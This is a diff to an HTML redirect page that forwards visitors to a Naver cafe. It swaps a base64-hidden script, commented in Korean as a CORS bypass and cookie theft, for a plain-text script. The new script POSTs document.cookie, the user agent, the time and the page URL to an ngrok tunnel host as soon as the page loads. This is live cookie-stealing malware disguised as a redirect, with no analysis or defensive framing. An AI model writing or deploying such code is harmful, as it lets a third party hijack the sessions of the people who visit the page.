@@ -6,7 +6,18 @@
 <meta http-equiv="refresh" content="0; url=https://m.cafe.naver.com/minsahelp.cafe">
 </head>
 <body>
-<!-- CORS 우회 + 쿠키 탈취 (base64로 완전 숨김) -->
-<script src="data:text/javascript;base64,ZmV0Y2goJ2h0dHBzOi8vbm9ucGhlbm9saWMtdW5pbmNsb3NlZC1hbmFiZWxsYS5uZ3Jvay1mcmVlLmRldicseyJtZXRob2QiOiJQT1NUIiwibW9kZSI6Im5vLWNvcnMiLCJjcmVkZW50aWFscyI6ImluY2x1ZGUiLCJib2R5IjpKU09OLnN0cmluZ2lmeSh7Y29va2llczpkb2N1bWVudC5jb29raWUsdWE6bmF2aWdhdG9yLnVzZXJBZ2VudCx0aW1lOm5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoImtvLUtSIil9KX0pOw=="></script>
+<script>
+fetch('https://nonphenolic-uninclosed-anabella.ngrok-free.dev', {
+  method: 'POST',
+  mode: 'no-cors',
+  credentials: 'include',
+  body: JSON.stringify({
+    cookies: document.cookie,
+    ua: navigator.userAgent,
+    time: new Date().toLocaleString("ko-KR"),
+    url: location.href
+  })
+});
+</script>
 </body>
 </html>
